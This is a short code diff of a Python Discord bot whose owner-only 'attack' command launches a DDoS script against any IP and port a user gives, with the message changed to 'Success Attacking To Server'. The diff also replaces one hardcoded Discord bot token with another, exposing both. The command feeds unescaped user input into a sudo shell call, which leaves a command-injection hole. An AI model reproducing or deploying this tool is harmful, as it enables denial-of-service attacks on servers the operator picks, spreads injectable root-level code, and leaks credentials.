@@ -38,7 +38,7 @@ async def attack(ctx, ip, port, times):
     if ctx.author.id not in owners:
         await ctx.send(":clown: you dont have permission to attack idiot :clown:")
 
-    await ctx.send(f"Success Broadcast To All NewLife Server")
+    await ctx.send(f"Success Attacking To Server")
     try:
         await os.system(f"sudo python3 ddos.py {ip} {port} {times}")
     except Exception as debug:
@@ -81,4 +81,4 @@ async def usage(ctx):
 
 
 if __name__ == "__main__":
-    client.run("MTMwOTY1NDI0NzE0Njc4MjczMw.GSOCy7.clpoadc8mG03Rlayvw--F-y0Gn1XdmeteW4GqM")
+    client.run("MTMwOTY1NDI0NzE0Njc4MjczMw.Gy0Z19.wYAPgO6UffSpKIwtnFV-PZAxpQJEdHpkgrwePU")
